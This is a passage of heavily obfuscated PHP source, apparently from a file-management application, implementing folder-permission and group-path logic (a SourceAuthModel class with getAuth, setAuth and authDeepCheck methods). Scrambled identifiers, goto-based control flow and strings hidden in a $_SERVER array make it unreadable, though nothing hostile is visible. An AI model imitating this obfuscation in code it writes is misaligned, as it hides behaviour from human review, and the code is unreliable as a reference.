Model($eÈ¨‚Õ²[2180])->where($FõçŠğ•¢)->select(); $dÎéÉÑÒŠ = array_to_keyvalue_group($dÎéÉÑÒŠ, $eÈ¨‚Õ²[2107]); foreach ($dÎéÉÑÒŠ as &$BôˆŞåÀœÌ) { $BôˆŞåÀœÌ = array_to_keyvalue($BôˆŞåÀœÌ, $eÈ¨‚Õ²[99], $eÈ¨‚Õ²[368]); } foreach ($dª©ÍµòÍô as &$e—÷¯Øàï©) { $e—÷¯Øàï©[$eÈ¨‚Õ²[425]] = array(); if (isset($dÎéÉÑÒŠ[$e—÷¯Øàï©[$eÈ¨‚Õ²[2107]]])) { $e—÷¯Øàï©[$eÈ¨‚Õ²[425]] = $dÎéÉÑÒŠ[$e—÷¯Øàï©[$eÈ¨‚Õ²[2107]]]; } } } protected function parentLevelArray($Bîµ‰¿ÏÄ) { $C‡Î´äÚá =& $_SERVER[¶ªÕß‚ØÁŸ]; $Bîµ‰¿ÏÄ = explode($C‡Î´äÚá[47], trim($Bîµ‰¿ÏÄ, $C‡Î´äÚá[47])); $Bîµ‰¿ÏÄ = array_remove_value($Bîµ‰¿ÏÄ, $C‡Î´äÚá[476]); return $Bîµ‰¿ÏÄ; } private function _listAppendParent(&$DÜ±‡Šô‹Á) { goto fŸçŸõ¾¾; fŸçŸõ¾¾: $dõ©ŞŞÄ’ø =& $_SERVER[¶ªÕß‚ØÁŸ]; $AÌÆƒÒåéÎ = array(); foreach ($DÜ±‡Šô‹Á as &$a¼ˆÙèÁ¿Ÿ) { $AÌÆƒÒåéÎ[$a¼ˆÙèÁ¿Ÿ[$dõ©ŞŞÄ’ø[2107]]] = $a¼ˆÙèÁ¿Ÿ[$dõ©ŞŞÄ’ø[28]]; $BÚäÇÅÉø° = $this->parentLevelArray($a¼ˆÙèÁ¿Ÿ[$dõ©ŞŞÄ’ø[467]]); foreach ($BÚäÇÅÉø° as $E¾åÑ¢óÒÛ) { if (!isset($AÌÆƒÒåéÎ[$E¾åÑ¢óÒÛ])) { $AÌÆƒÒåéÎ[$E¾åÑ¢óÒÛ] = 0; } } } goto fäˆ…íñ¿Ì; fäˆ…íñ¿Ì: $fó‡ßÜ¯ä = array(); foreach ($AÌÆƒÒåéÎ as $DòÎ†ÉÂÜŸ => $AìÂò‡ëµ) { if (!$AìÂò‡ëµ) { $fó‡ßÜ¯ä[] = $DòÎ†ÉÂÜŸ; } } if ($fó‡ßÜ¯ä) { $e¥¾ù˜Ç = array($dõ©ŞŞÄ’ø[2179] => array($dõ©ŞŞÄ’ø[392], $fó‡ßÜ¯ä)); $D¨òÛÄò = $this->field($dõ©ŞŞÄ’ø[2192])->where($e¥¾ù˜Ç)->select(); $d°»á¼ªÑß = array_to_keyvalue($D¨òÛÄò, $dõ©ŞŞÄ’ø[2107], $dõ©ŞŞÄ’ø[28]); $AÌÆƒÒåéÎ = array_merge_index($AÌÆƒÒåéÎ, $d°»á¼ªÑß); } goto EÑÃŞòƒÍ¸; EÑÃŞòƒÍ¸: foreach ($DÜ±‡Šô‹Á as &$a¼ˆÙèÁ¿Ÿ) { $BÚäÇÅÉø° = $this->parentLevelArray($a¼ˆÙèÁ¿Ÿ[$dõ©ŞŞÄ’ø[467]]); $Eù›‰âÍ = $dõ©ŞŞÄ’ø[33]; foreach ($BÚäÇÅÉø° as $E¾åÑ¢óÒÛ) { $Eù›‰âÍ .= $AÌÆƒÒåéÎ[$E¾åÑ¢óÒÛ] . $dõ©ŞŞÄ’ø[8]; } if ($BÚäÇÅÉø°) { $Eù›‰âÍ .= $a¼ˆÙèÁ¿Ÿ[$dõ©ŞŞÄ’ø[28]]; } $a¼ˆÙèÁ¿Ÿ[$dõ©ŞŞÄ’ø[471]] = str_replace($dõ©ŞŞÄ’ø[475], $dõ©ŞŞÄ’ø[8], $Eù›‰âÍ); } goto f„º¯Áì; f„º¯Áì: } private function _listAppendSourceRoot(&$c„ù—ì‹ƒÃ, $dŒÎçÌó») { goto a¦Ìì„„¬‹; cĞ÷™ÆÁ: $A²»İéÏ… = Model($B£¼¸êëíˆ[766])->order($B£¼¸êëíˆ[2194])->field($eí‹ÎØ§ãÁ)->where($e÷¾‚É«í“)->select(); $A²»İéÏ… = array_to_keyvalue($A²»İéÏ…, $B£¼¸êëíˆ[464]); $A²»İéÏ… = array_remove_key($A²»İéÏ…, $B£¼¸êëíˆ[464]); goto Dœõ©Ê·í¿; Dœõ©Ê·í¿: foreach ($c„ù—ì‹ƒÃ as &$C¾ó«ŒÎí) { $C¾ó«ŒÎí[$B£¼¸êëíˆ[399]] = $A²»İéÏ…[$C¾ó«ŒÎí[$B£¼¸êëíˆ[2107]]] ? $A²»İéÏ…[$C¾ó«ŒÎí[$B£¼¸êëíˆ[2107]]] : array(); } goto FŒ¡Æã“ª·; a¦Ìì„„¬‹: $B£¼¸êëíˆ =& $_SERVER[¶ªÕß‚ØÁŸ]; $e÷¾‚É«í“ = array($B£¼¸êëíˆ[379] => SourceModel::TYPE_GROUP, $B£¼¸êëíˆ[469] => 0, $B£¼¸êëíˆ[464] => array($B£¼¸êëíˆ[7], $dŒÎçÌó»)); $eí‹ÎØ§ãÁ = $B£¼¸êëíˆ[2193]; goto cĞ÷™ÆÁ; FŒ¡Æã“ª·: } protected function resetParentLevel() { $a¦Û¾¼°œò =& $_SERVER[¶ªÕß‚ØÁŸ]; $b‹ÎÊêø„ = $a¦Û¾¼°œò[2107]; $dšöÒÙ¢Èô = $this->select(); $dšöÒÙ¢Èô = array_to_keyvalue($dšöÒÙ¢Èô, $b‹ÎÊêø„); foreach ($dšöÒÙ¢Èô as $Dö•†˜‰ÁÎ) { goto BíïØ¸™¯; BÊä’Šë™Ú: $DÙğ°™ÑØ«[] = 0; $DÙğ°™ÑØ« = $a¦Û¾¼°œò[47] . implode($a¦Û¾¼°œò[47], array_reverse($DÙğ°™ÑØ«)) . $a¦Û¾¼°œò[47]; $this->setNamePinyin($Dö•†˜‰ÁÎ[$b‹ÎÊêø„], $Dö•†˜‰ÁÎ[$a¦Û¾¼°œò[28]]); goto A¿È‡…‚; BíïØ¸™¯: $AšÂ‚¼åÖÃ = $Dö•†˜‰ÁÎ; $DÙğ°™ÑØ« = array(); while ($AšÂ‚¼åÖÃ[$a¦Û¾¼°œò[469]] != 0) { $DÙğ°™ÑØ«[] = $AšÂ‚¼åÖÃ[$a¦Û¾¼°œò[469]]; $AšÂ‚¼åÖÃ = $dšöÒÙ¢Èô[$AšÂ‚¼åÖÃ[$a¦Û¾¼°œò[469]]]; } goto BÊä’Šë™Ú; A¿È‡…‚: $this->where(array($b‹ÎÊêø„ => $Dö•†˜‰ÁÎ[$b‹ÎÊêø„]))->save(array($a¦Û¾¼°œò[533] => $DÙğ°™ÑØ«)); goto DóÜêŒÍâÓ; DóÜêŒÍâÓ: } return $dšöÒÙ¢Èô; } public function groupNameAuto($D¡Ôº‡½èÀ, $aéˆ´¼àí‰) { $AĞ…àÒñé =& $_SERVER[¶ªÕß‚ØÁŸ]; $Fç²­ÙÜÁÀ = $this->where(array($AĞ…àÒñé[376] => $D¡Ôº‡½èÀ))->getField($AĞ…àÒñé[28], !0); if (!$Fç²­ÙÜÁÀ || !in_array($aéˆ´¼àí‰, $Fç²­ÙÜÁÀ)) { return $aéˆ´¼àí‰; } for ($Bİ±¢ˆ‡µÕ = 1; $Bİ±¢ˆ‡µÕ <= count($Fç²­ÙÜÁÀ) + 1; $Bİ±¢ˆ‡µÕ++) { $eÔÖé£’¶š = $aéˆ´¼àí‰ . "\50{$Bİ±¢ˆ‡µÕ}\x29"; if (!in_array($eÔÖé£’¶š, $Fç²­ÙÜÁÀ)) { return $eÔÖé£’¶š; } } } } goto C÷ç²Ìõá; dêŒº ´ô: define($_SERVER[¶ªÕß‚ØÁŸ][1935], 1); define($_SERVER[¶ªÕß‚ØÁŸ][1936], 2); define($_SERVER[¶ªÕß‚ØÁŸ][1937], 3); goto Dµ›á°„Ì¥; f«æ˜öƒÒ: class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\165\162\x63\145\x5f\141\x75\x74\150"; public function getAuth($cä–ˆ‘Ãõ„) { goto e¿‡¤®¥ò›; A®«ºÚõîÖ: return $c–ÔÏº‘Ö´; goto AÆ“„Ñ›‰; e¿‡¤®¥ò›: $Eò„ÆÛŠœŒ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Eî§¼äª™â = $Eò„ÆÛŠœŒ[2253]; $bñË«à†ê = array($Eò„ÆÛŠœŒ[377] => $cä–ˆ‘Ãõ„); goto EÔ„ïìğœ÷; EÔ„ïìğœ÷: $A’òÎ·åù¢ = $this->field($Eî§¼äª™â)->order($Eò„ÆÛŠœŒ[375])->where($bñË«à†ê)->select(); $c–ÔÏº‘Ö´ = array(); foreach ($A’òÎ·åù¢ as $CÅµ¼…ßÈ) { if (Model($Eò„ÆÛŠœŒ[2254])->listData($CÅµ¼…ßÈ[$Eò„ÆÛŠœŒ[2235]])) { $c–ÔÏº‘Ö´[] = $CÅµ¼…ßÈ; } } goto A®«ºÚõîÖ; AÆ“„Ñ›‰: } public function setAuth($E–šÑÏ¬Áš, $Då‹ƒŞöÄ) { goto c† É¦„‘Ê; a¨ò×ÌàÈÇ: $this->where(array($fàå¯†Üª‰[391] => $E–šÑÏ¬Áš))->delete(); $this->addAll($DºäÛ¡„Şš); return !0; goto aåÀÂÖíÔğ; EŒÔ‡ºÔ: $Dˆ´¥®ïÔÖ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $DºäÛ¡„Şš = array(); foreach ($Då‹ƒŞöÄ as $d´ËæÀÍ’ß) { if (!in_array($d´ËæÀÍ’ß[$fàå¯†Üª‰[379]], $Dˆ´¥®ïÔÖ)) { show_json(LNG($fàå¯†Üª‰[2255]), !1); } if ($BÜéôøãï™ != $A‹Çïµ¸äƒ) { if ($d´ËæÀÍ’ß[$fàå¯†Üª‰[379]] == SourceModel::TYPE_GROUP) { } if ($d´ËæÀÍ’ß[$fàå¯†Üª‰[464]] != 0 && !in_array($d´ËæÀÍ’ß[$fàå¯†Üª‰[464]], $fÎâÏİÅ•)) { } } if ($d´ËæÀÍ’ß[$fàå¯†Üª‰[464]] == 0) { $d´ËæÀÍ’ß[$fàå¯†Üª‰[379]] = SourceModel::TYPE_USER; } $DºäÛ¡„Şš[] = array($fàå¯†Üª‰[377] => $E–šÑÏ¬Áš, $fàå¯†Üª‰[379] => intval($d´ËæÀÍ’ß[$fàå¯†Üª‰[379]]), $fàå¯†Üª‰[464] => intval($d´ËæÀÍ’ß[$fàå¯†Üª‰[464]]), $fàå¯†Üª‰[2235] => intval($d´ËæÀÍ’ß[$fàå¯†Üª‰[2235]]) ? intval($d´ËæÀÍ’ß[$fàå¯†Üª‰[2235]]) : 0, $fàå¯†Üª‰[2236] => intval($d´ËæÀÍ’ß[$fàå¯†Üª‰[2236]]) ? intval($d´ËæÀÍ’ß[$fàå¯†Üª‰[2236]]) : -1); } goto a¨ò×ÌàÈÇ; FÇ¼¦Œ™ã: $A‹Çïµ¸äƒ = 1; $BÜéôøãï™ = $f­Îˆ„‹¬[$fàå¯†Üª‰[464]]; if ($BÜéôøãï™ != $A‹Çïµ¸äƒ) { $C†”Š²×ÆŠ = array($fàå¯†Üª‰[2107] => $BÜéôøãï™); $fÎâÏİÅ• = Model($fàå¯†Üª‰[2181])->field($fàå¯†Üª‰[1440])->where($C†”Š²×ÆŠ)->select(); $fÎâÏİÅ• = array_to_keyvalue($fÎâÏİÅ•, $fàå¯†Üª‰[33], $fàå¯†Üª‰[1440]); } goto EŒÔ‡ºÔ; c† É¦„‘Ê: $fàå¯†Üª‰ =& $_SERVER[¶ªÕß‚ØÁŸ]; $f­Îˆ„‹¬ = Model($fàå¯†Üª‰[1121])->sourceInfo($E–šÑÏ¬Áš); if ($f­Îˆ„‹¬[$fàå¯†Üª‰[379]] != SourceModel::TYPE_GROUP) { return !1; } goto FÇ¼¦Œ™ã; aåÀÂÖíÔğ: } public function authClear($Cí÷ºÅ§©ª) { $a˜Ú¼’›È³ =& $_SERVER[¶ªÕß‚ØÁŸ]; $C¤–—Ø®ª = Model($a˜Ú¼’›È³[1121])->sourceInfo($Cí÷ºÅ§©ª); $dŞ«•°øÑ® = array($Cí÷ºÅ§©ª); if ($C¤–—Ø®ª[$a˜Ú¼’›È³[378]] == $a˜Ú¼’›È³[93]) { $CÌ¶ŞŞÍŸ = array($a˜Ú¼’›È³[533] => array($a˜Ú¼’›È³[491], $C¤–—Ø®ª[$a˜Ú¼’›È³[467]] . $Cí÷ºÅ§©ª . $a˜Ú¼’›È³[492])); $dŞ«•°øÑ® = Model($a˜Ú¼’›È³[1121])->field($a˜Ú¼’›È³[391])->where($CÌ¶ŞŞÍŸ)->getField($a˜Ú¼’›È³[377], !0); $dŞ«•°øÑ®[] = $Cí÷ºÅ§©ª; } $this->where(array($a˜Ú¼’›È³[391] => array($a˜Ú¼’›È³[392], $dŞ«•°øÑ®)))->delete(); return !0; } public function get($b‰‚¨œæëµ) { $e‹ƒ‹Ëáª = $this->getSourceList(array($b‰‚¨œæëµ), !0); return $e‹ƒ‹Ëáª[0]; } public function getSourceList($cˆÄ¾Îªœ», $aÜùœÄƒ = false) { goto FîùÜµİÔù; D´ƒ±†ñ’: $c•’Ïøî‘ª = array(); foreach ($aÜùœÄƒ as $AìÂ‰•¨®… => $C¼ÕâõÊœº) { $c•’Ïøî‘ª[$AìÂ‰•¨®…] = $this->makeSourceAuth($C¼ÕâõÊœº, $B¨³øäÕ); } return $c•’Ïøî‘ª; goto D¥ß­è¢ÎÃ; B—Ñ¼•Ï„†: if (!$aÜùœÄƒ) { $cÜ²­¶®Õö = array($B°Íêãô¹Ñ[391] => array($B°Íêãô¹Ñ[392], $cˆÄ¾Îªœ»)); $aÜùœÄƒ = $e¶¯ÛÇ¤³•->field($B°Íêãô¹Ñ[2256])->where($cÜ²­¶®Õö)->select(); $aÜùœÄƒ = array_to_keyvalue($aÜùœÄƒ, $B°Íêãô¹Ñ[377]); } $eø¨È–¬ë¢ = $cˆÄ¾Îªœ»; foreach ($aÜùœÄƒ as $Eñ¯“Ó¸ => $fƒëÕà‚Â) { $EË¬êí©Ã© = $e¶¯ÛÇ¤³•->parentLevelArray($fƒëÕà‚Â[$B°Íêãô¹Ñ[467]]); $eø¨È–¬ë¢ = array_merge($eø¨È–¬ë¢, $EË¬êí©Ã©, array($Eñ¯“Ó¸)); } goto FÎ—ó‹ÏØ¡; aíÖà·‹Ûº: $cÜ²­¶®Õö = array($B°Íêãô¹Ñ[391] => array($B°Íêãô¹Ñ[392], $eø¨È–¬ë¢)); $B¨³øäÕ = $this->field($F‚î‡ÍøÉ)->where($cÜ²­¶®Õö)->select(); $B¨³øäÕ = array_to_keyvalue_group($B¨³øäÕ, $B°Íêãô¹Ñ[377]); goto D´ƒ±†ñ’; FÎ—ó‹ÏØ¡: $eø¨È–¬ë¢ = array_values(array_unique($eø¨È–¬ë¢)); if (!$eø¨È–¬ë¢) { return array(); } $F‚î‡ÍøÉ = $B°Íêãô¹Ñ[2257]; goto aíÖà·‹Ûº; FîùÜµİÔù: $B°Íêãô¹Ñ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$cˆÄ¾Îªœ») { return array(); } $e¶¯ÛÇ¤³• = Model($B°Íêãô¹Ñ[1121]); goto B—Ñ¼•Ï„†; D¥ß­è¢ÎÃ: } public function authDeepCheck($A¢‹±¦…‹±) { goto BØ“º‹ê¸ê; BØ“º‹ê¸ê: $EœÛÕ„‚Ö =& $_SERVER[¶ªÕß‚ØÁŸ]; if (_get($GLOBALS, $EœÛÕ„‚Ö[465])) { return !1; } $bøµ‘‰·„  = $this->makeAuthDeep(); goto d†«š”¥óŠ; d†«š”¥óŠ: if (!in_array($A¢‹±¦…‹±, $bøµ‘‰·„ [$EœÛÕ„‚Ö[2258]])) { return !1; } $B¬…Á¾Ú˜Ë = array(); foreach ($bøµ‘‰·„ [$EœÛÕ„‚Ö[2259]] as $cñÙØ¦´Î… => $DËèæ¼Ø) { if (!in_array($A¢‹±¦…‹±, $DËèæ¼Ø)) { continue; } $B¬…Á¾Ú˜Ë[] = $cñÙØ¦´Î…; } goto Eô¥–í¥æĞ; Eô¥–í¥æĞ: $DŞ˜¬ôƒ‡ = $B¬…Á¾Ú˜Ë ? $B¬…Á¾Ú˜Ë[0] : $A¢‹±¦…‹±; return array($EœÛÕ„‚Ö[385] => -1, $EœÛÕ„‚Ö[426] => array($EœÛÕ„‚Ö[393] => $EœÛÕ„‚Ö[1035], $EœÛÕ„‚Ö[2113] => $EœÛÕ„‚Ö[476], $EœÛÕ„‚Ö[394] => LNG($EœÛÕ„‚Ö[2260]), $EœÛÕ„‚Ö[2125] => $EœÛÕ„‚Ö[2261]), $EœÛÕ„‚Ö[2262] => array($EœÛÕ„‚Ö[396] => $EœÛÕ„‚Ö[2263], $EœÛÕ„‚Ö[85] => $DŞ˜¬ôƒ‡)); goto CàÌøŠ£‰Ñ; CàÌøŠ£‰Ñ: } protected function makeAuthDeep() { goto bœƒø¾•¼ù; b¯Ø£‘¤µ…: foreach ($B†‹¸Õò¿Ë as $a²èŒ½½° => $EÃ„©›ƒÖÊ) { $dÂÄÜä Ÿ  = $fºÛÅÙ‘Œ±[$a²èŒ½½°]; if (!$dÂÄÜä Ÿ  || !$FÀ—²º„Â‘[$dÂÄÜä Ÿ ]) { continue; } $E–ÉÕŸÅ = array(); foreach ($déïìù™¤[$dÂÄÜä Ÿ ] as $CÔá‡ƒù÷¦) { $E–ÉÕŸÅ[] = $FÀ—²º„Â‘[$CÔá‡ƒù÷¦]; } $B†‹¸Õò¿Ë[$a²èŒ½½°] = array_merge($E–ÉÕŸÅ, $EÃ„©›ƒÖÊ); } $eâ¿ô‚ªº = array_values(array_unique($eâ¿ô‚ªº)); $Ağãµ¨Üå = array($cæÖÀö§ˆ[2258] => $eâ¿ô‚ªº, $cæÖÀö§ˆ[2259] => $B†‹¸Õò¿Ë); goto Eëñ‡âñóİ; Eëñ‡âñóİ: return $Ağãµ¨Üå; goto cÊ×ŒõÆå; C£˜Ş‚ÑË: if ($fÊÚ‚™Ü·…) { $a‡öÄÚª¥ = $dï›ÖˆÕœ->where(array($cæÖÀö§ˆ[377] => array($cæÖÀö§ˆ[392], $fÊÚ‚™Ü·…)))->select(); foreach ($a‡öÄÚª¥ as $döÑ†ºğ„) { $CŞ‘‰¥¦ = $dï›ÖˆÕœ->parentLevelArray($döÑ†ºğ„[$cæÖÀö§ˆ[467]]); $eâ¿ô‚ªº = array_merge($eâ¿ô‚ªº, $CŞ‘‰¥¦); $AÃÕ±Û”©æ[] = $döÑ†ºğ„[$cæÖÀö§ˆ[464]]; $B†‹¸Õò¿Ë[$döÑ†ºğ„[$cæÖÀö§ˆ[377]]] = $CŞ‘‰¥¦; $fºÛÅÙ‘Œ±[$döÑ†ºğ„[$cæÖÀö§ˆ[377]]] = $döÑ†ºğ„[$cæÖÀö§ˆ[464]]; } } $AÃÕ±Û”©æ = array_values(array_unique($AÃÕ±Û”©æ)); $BÖÌ®“‰â = $AÃÕ±Û”©æ; goto dâšùÇ¹òÇ; DÛ‘Ô©Ì: if ($B÷ ²›ìŞ‘) { $bÆ¹ÉÖĞ” = array(array($cæÖÀö§ˆ[379] => SourceModel::TYPE_USER, $cæÖÀö§ˆ[464] => USER_ID), array($cæÖÀö§ˆ[379] => SourceModel::TYPE_GROUP, $cæÖÀö§ˆ[464] => array($cæÖÀö§ˆ[392], $B÷ ²›ìŞ‘)), $cæÖÀö§ˆ[920] => $cæÖÀö§ˆ[2187]); } if ($b–¹Ğ·º÷Å) { $bÆ¹ÉÖĞ” = array($bÆ¹ÉÖĞ”, $cæÖÀö§ˆ[2235] => array($cæÖÀö§ˆ[2265], $b–¹Ğ·º÷Å)); } $fÊæ—¨¯¯ = $this->field($cæÖÀö§ˆ[2266])->where($bÆ¹ÉÖĞ”)->select(); goto eõß¡á„è¸; Cœ¿¤Ù“Ğã: $dï›ÖˆÕœ = Model($cæÖÀö§ˆ[1121]); $eöáÑöÓ‘ = Model($cæÖÀö§ˆ[466]); $B†‹¸Õò¿Ë = array(); goto eâŒ‰†á; c–ø©Å—Şâ: $E®í³á”¦± = Model($cæÖÀö§ˆ[2264])->listData(); $b–¹Ğ·º÷Å = array(); foreach ($E®í³á”¦± as $CÖÉÊ—Òã) { if ($CÖÉÊ—Òã[$cæÖÀö§ˆ[384]] == 0 && $CÖÉÊ—Òã[$cæÖÀö§ˆ[2127]] == $cæÖÀö§ˆ[93]) { $b–¹Ğ·º÷Å[] = $CÖÉÊ—Òã[$cæÖÀö§ˆ[375]]; } } goto F—¹ÏÓôˆ; F—¹ÏÓôˆ: $B÷ ²›ìŞ‘ = Session::get($cæÖÀö§ˆ[2219]); $B÷ ²›ìŞ‘ = array_to_keyvalue($B÷ ²›ìŞ‘, $cæÖÀö§ˆ[33], $cæÖÀö§ˆ[2107]); $bÆ¹ÉÖĞ” = array($cæÖÀö§ˆ[379] => SourceModel::TYPE_USER, $cæÖÀö§ˆ[464] => USER_ID); goto DÛ‘Ô©Ì; dâšùÇ¹òÇ: foreach ($BÖÌ®“‰â as $CÔá‡ƒù÷¦) { $Dãğ‹µì¾Ì = $eöáÑöÓ‘->getInfo($CÔá‡ƒù÷¦); $CŞ‘‰¥¦ = $dï›ÖˆÕœ->parentLevelArray($Dãğ‹µì¾Ì[$cæÖÀö§ˆ[467]]); $AÃÕ±Û”©æ = array_merge($AÃÕ±Û”©æ, $CŞ‘‰¥¦); } $AÃÕ±Û”©æ = array_values(array_unique($AÃÕ±Û”©æ)); foreach ($AÃÕ±Û”©æ as $CÔá‡ƒù÷¦) { $Dãğ‹µì¾Ì = $eöáÑöÓ‘->getInfo($CÔá‡ƒù÷¦); $eâ¿ô‚ªº[] = $Dãğ‹µì¾Ì[$cæÖÀö§ˆ[399]][$cæÖÀö§ˆ[377]]; $FÀ—²º„Â‘[$CÔá‡ƒù÷¦] = $Dãğ‹µì¾Ì[$cæÖÀö§ˆ[399]][$cæÖÀö§ˆ[377]]; $déïìù™¤[$CÔá‡ƒù÷¦] = $dï›ÖˆÕœ->parentLevelArray($Dãğ‹µì¾Ì[$cæÖÀö§ˆ[467]]); } goto b¯Ø£‘¤µ…; bœƒø¾•¼ù: $cæÖÀö§ˆ =& $_SERVER[¶ªÕß‚ØÁŸ]; static $Ağãµ¨Üå = false; if ($Ağãµ¨Üå) { return $Ağãµ¨Üå; } goto c–ø©Å—Şâ; eâŒ‰†á: $fºÛÅÙ‘Œ± = array(); $FÀ—²º„Â‘ = array(); $déïìù™¤ = array(); goto C£˜Ş‚ÑË; eõß¡á„è¸: $fÊÚ‚™Ü·… = array_to_keyvalue($fÊæ—¨¯¯, $cæÖÀö§ˆ[33], $cæÖÀö§ˆ[377]); $eâ¿ô‚ªº = array(); $AÃÕ±Û”©æ = $B÷ ²›ìŞ‘; goto Cœ¿¤Ù“Ğã; cÊ×ŒõÆå: } private function makeSourceAuth($CËåî¨ğáò, $EÎ«ù½±) { goto e™àŞ†Æ¡…; d¹Šï¢Ä·Ä: if ($CËåî¨ğáò[$d§¸…•™¹ê[379]] == SourceModel::TYPE_GROUP) { $BŒŞ—Ğ¤®õ = $CËåî¨ğáò[$d§¸…•™¹ê[464]]; if (isset($F¸µ«æ’ö[$BŒŞ—Ğ¤®õ]) && !_get($GLOBALS, $d§¸…•™¹ê[465])) { $eö›Ã‡‡ß‹ = $F¸µ«æ’ö[$BŒŞ—Ğ¤®õ]; if (Model($d§¸…•™¹ê[2254])->authCheckRoot($eö›Ã‡‡ß‹[$d§¸…•™¹ê[384]][$d§¸…•™¹ê[384]])) { $dÙáÛ‚Şä = Model($d§¸…•™¹ê[466])->getInfo($BŒŞ—Ğ¤®õ); $bÓˆ·„Í½´ = array($d§¸…•™¹ê[2267] => intval($eö›Ã‡‡ß‹[$d§¸…•™¹ê[384]][$d§¸…•™¹ê[384]]), $d§¸…•™¹ê[2268] => $eö›Ã‡‡ß‹[$d§¸…•™¹ê[384]], $d§¸…•™¹ê[2262] => array($d§¸…•™¹ê[396] => $d§¸…•™¹ê[2269], $d§¸…•™¹ê[2270] => $dÙáÛ‚Şä[$d§¸…•™¹ê[399]][$d§¸…•™¹ê[377]], $d§¸…•™¹ê[2271] => $dÙáÛ‚Şä[$d§¸…•™¹ê[471]])); return $bÓˆ·„Í½´; } } } $bÓˆ·„Í½´ = !1; foreach ($EÖœÊ™É as $eãßàèƒÆà) { if (!isset($EÎ«ù½±[$eãßàèƒÆà])) { continue; } $aÉÄ‹Ç™Ò = $this->authMake($EÎ«ù½±[$eãßàèƒÆà]); if ($aÉÄ‹Ç™Ò[$d§¸…•™¹ê[426]]) { $bÓˆ·„Í½´ = $aÉÄ‹Ç™Ò; break; } } goto DÛŸ©½ŒÆ˜; e™àŞ†Æ¡…: $d§¸…•™¹ê =& $_SERVER[¶ªÕß‚ØÁŸ]; $F¸µ«æ’ö = Session::get($d§¸…•™¹ê[2219]); $F¸µ«æ’ö = array_to_keyvalue($F¸µ«æ’ö, $d§¸…•™¹ê[2107]); goto E¸Üç—ÎŸÜ; DÛŸ©½ŒÆ˜: if (!$bÓˆ·„Í½´ && $CËåî¨ğáò[$d§¸…•™¹ê[379]] == SourceModel::TYPE_GROUP) { $BŒŞ—Ğ¤®õ = $CËåî¨ğáò[$d§¸…•™¹ê[464]]; if (isset($F¸µ«æ’ö[$BŒŞ—Ğ¤®õ])) { $eö›Ã‡‡ß‹ = $F¸µ«æ’ö[$BŒŞ—Ğ¤®õ]; $dÙáÛ‚Şä = Model($d§¸…•™¹ê[466])->getInfo($BŒŞ—Ğ¤®õ); $bÓˆ·„Í½´ = array($d§¸…•™¹ê[2267] => intval($eö›Ã‡‡ß‹[$d§¸…•™¹ê[384]][$d§¸…•™¹ê[384]]), $d§¸…•™¹ê[2268] => $eö›Ã‡‡ß‹[$d§¸…•™¹ê[384]], $d§¸…•™¹ê[2262] => array($d§¸…•™¹ê[396] => $d§¸…•™¹ê[2272], $d§¸…•™¹ê[85] => $dÙáÛ‚Şä[$d§¸…•™¹ê[399]][$d§¸…•™¹ê[377]], $d§¸…•™¹ê[2271] => $dÙáÛ‚Şä[$d§¸…•™¹ê[471]])); return $bÓˆ·„Í½´; } } if (!$bÓˆ·„Í½´ && $CËåî¨ğáò[$d§¸…•™¹ê[379]] == SourceModel::TYPE_GROUP) { $dÙáÛ‚Şä = Model($d§¸…•™¹ê[466])->getInfo($CËåî¨ğáò[$d§¸…•™¹ê[464]]); $f”±ğœÊãË = explode($d§¸…•™¹ê[47], trim($dÙáÛ‚Şä[$d§¸…•™¹ê[467]], $d§¸…•™¹ê[47])); foreach ($f”±ğœÊãË as $BŒŞ—Ğ¤®õ) { if ($BŒŞ—Ğ¤®õ == $d§¸…•™¹ê[476] || $BŒŞ—Ğ¤®õ == $C×‘Š÷¤Ú×) { continue; } if (!isset($F¸µ«æ’ö[$BŒŞ—Ğ¤®õ])) { continue; } $eö›Ã‡‡ß‹ = $F¸µ«æ’ö[$BŒŞ—Ğ¤®õ]; $bÓˆ·„Í½´ = array($d§¸…•™¹ê[2267] => intval($eö›Ã‡‡ß‹[$d§¸…•™¹ê[384]][$d§¸…•™¹ê[384]]), $d§¸…•™¹ê[2268] => $eö›Ã‡‡ß‹[$d§¸…•™¹ê[384]], $d§¸…•™¹ê[2262] => array($d§¸…•™¹ê[396] => $d§¸…•™¹ê[2269], $d§¸…•™¹ê[2270] => $dÙáÛ‚Şä[$d§¸…•™¹ê[399]][$d§¸…•™¹ê[377]], $d§¸…•™¹ê[2271] => $dÙáÛ‚Şä[$d§¸…•™¹ê[471]])); break; } } if ((!$bÓˆ·„Í½´ || $bÓˆ·„Í½´[$d§¸…•™¹ê[385]] <= 0) && $CËåî¨ğáò[$d§¸…•™¹ê[379]] == SourceModel::TYPE_GROUP) { $cÁğÑ¥Ğ‰² = $this->authDeepCheck($CËåî¨ğáò[$d§¸…•™¹ê[377]]); if ($cÁğÑ¥Ğ‰²) { $bÓˆ·„Í½´ = $cÁğÑ¥Ğ‰²; } } goto cË×—†·Ç; E¸Üç—ÎŸÜ: $C×‘Š÷¤Ú× = $d§¸…•™¹ê[93]; $EÖœÊ™É = Model($d§¸…•™¹ê[1121])->parentLevelArray($CËåî¨ğáò[$d§¸…•™¹ê[467]]); $EÖœÊ™É = array_merge(array($CËåî¨ğáò[$d§¸…•™¹ê[377]]), array_reverse($EÖœÊ™É)); goto d¹Šï¢Ä·Ä; cË×—†·Ç: return $bÓˆ·„Í½´; goto AİœØ«Ÿ; AİœØ«Ÿ: } public function authOwnerApply($dÖÚé‹ğ·®) { goto b¾èÄÅÌ; FµÊ£·Ü†„: $DÅÖä‚¡é = array($B÷ÒòŒæÑ‹[391] => array($B÷ÒòŒæÑ‹[392], $AİÕ•“ÒÇß)); $D‰˜ÌİÊß‹ = $this->field($eËø÷Û×†×)->where($DÅÖä‚¡é)->select(); $D‰˜ÌİÊß‹ = array_to_keyvalue_group($D‰˜ÌİÊß‹, $B÷ÒòŒæÑ‹[377]); goto b±ÆÁ•Ğö; b¾èÄÅÌ: $B÷ÒòŒæÑ‹ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (empty($dÖÚé‹ğ·®[$B÷ÒòŒæÑ‹[384]]) || isset($dÖÚé‹ğ·®[$B÷ÒòŒæÑ‹[2273]]) && $dÖÚé‹ğ·®[$B÷ÒòŒæÑ‹[2273]]) { return $dÖÚé‹ğ·®; } if (AuthModel::authCheckRoot($dÖÚé‹ğ·®[$B÷ÒòŒæÑ‹[384]][$B÷ÒòŒæÑ‹[385]])) { return 